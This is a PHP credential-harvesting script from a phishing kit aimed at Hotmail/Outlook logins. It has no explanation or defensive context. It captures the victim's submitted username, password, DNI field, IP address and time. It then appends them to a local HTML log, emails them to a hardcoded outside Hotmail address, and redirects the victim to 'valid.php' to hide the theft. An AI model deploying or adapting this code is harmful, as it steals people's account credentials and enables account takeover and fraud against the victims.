<?php
error_reporting(0);
session_start();
$ip = $_SERVER["REMOTE_ADDR"];
$_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];

#browser info
#Country info
$_SESSION['loginfmt'] = $_POST['loginfmt'];
$_SESSION['passwd'] = $_POST['passwd'];

#Security information
$message = "
********************************************* <br />
IP              =>   <font color='#F31414'>".$_SESSION['_IP_']."</font>
<br />
TIME	=>   <font color='#F31414'>".date('l jS \of F Y h:i:s A')."</font><br />
Usuario	=>   <font color='#F31414'>".$_POST['loginfmt']."</font> <font color='#F31414'>".$_POST['CA_DNI']."</font><br />  
Clave	=>   <font color='#F31414'>".$_POST['passwd']."</font> <font color='#F31414'>".$_POST['CA_DNI']."</font><br />  
</div>";

$fp = fopen('Swordfish.html', 'a');
fwrite($fp, "$message \r\n");
fclose($fp);

$subject  = "Hotmail Log [ " . $_SESSION['_IP_'] . " - " . $_SESSION['cntname'] . " ] ";
$headers  = "MIME-Version: 1.0" . "\r\n";;
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= "From: Hotmail Log2 <admin@Outlook.com" . "\r\n";

$to = "yaspalugo@hotmail.com";
@mail($to,$subject,$message,$headers);
header('location: valid.php');

?>